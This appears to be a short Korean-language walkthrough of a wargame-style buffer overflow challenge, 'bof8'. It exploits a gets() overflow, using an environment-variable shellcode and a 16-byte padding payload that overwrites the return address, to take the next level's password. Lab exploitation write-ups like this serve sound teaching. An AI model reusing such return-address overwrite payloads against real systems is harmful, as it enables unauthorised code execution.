## bof8 solution
bof8.c의 구성을 살펴보면
<img width="1045" alt="스크린샷 2021-07-16 오후 3 47 01" src="https://user-images.githubusercontent.com/86994067/125922359-211ba701-a211-4ae9-9446-bdb7cff212a0.png">

<img width="923" alt="스크린샷 2021-07-16 오후 4 23 29" src="https://user-images.githubusercontent.com/86994067/126026332-bee24dd9-62c7-4873-a32b-980409db2899.png">

buf 인자를 입력받는 gets 함수가 취약점인 것을 파악할 수 있다.
getenv 함수를 보면 SHELLCODE 환경변수가 비어있다. 따라서 환경변수를 만들어 버퍼오버플로우를 통해
vuln 함수에서 ret이 수행될 수 있도록 만든다.

다음과 같이 환경변수를 만들고

<img width="890" alt="스크린샷 2021-07-17 오후 4 12 18" src="https://user-images.githubusercontent.com/86994067/126029272-c04cce15-6338-4d40-b724-df650fdeee03.png">

```
(python -c "print 'x'*16") | ./bof8
```
다음 명령어를 통해 환경변수의 주소값을 알 수 있다. (buf가 8byte, 64bit에서 SFP의 크기는 8byte이므로 더미값 16byte를 채워 주소를 확인한다.)

<img width="630" alt="스크린샷 2021-07-17 오후 4 13 09" src="https://user-images.githubusercontent.com/86994067/126029261-dff889d4-0d8a-4061-8fb8-25742bbbe4ff.png">

따라서 다음 페이로드를 작성하여 
```
(python -c "print 'x'*16 + '\xbf\xee\xff\xff\xff\x7f'";cat) | ./bof8
```
<img width="892" alt="스크린샷 2021-07-17 오후 4 11 39" src="https://user-images.githubusercontent.com/86994067/126029540-7ce7da86-5cfd-454f-b245-e99384c6f160.png">

bof9의 패스워드를 얻을 수 있다.



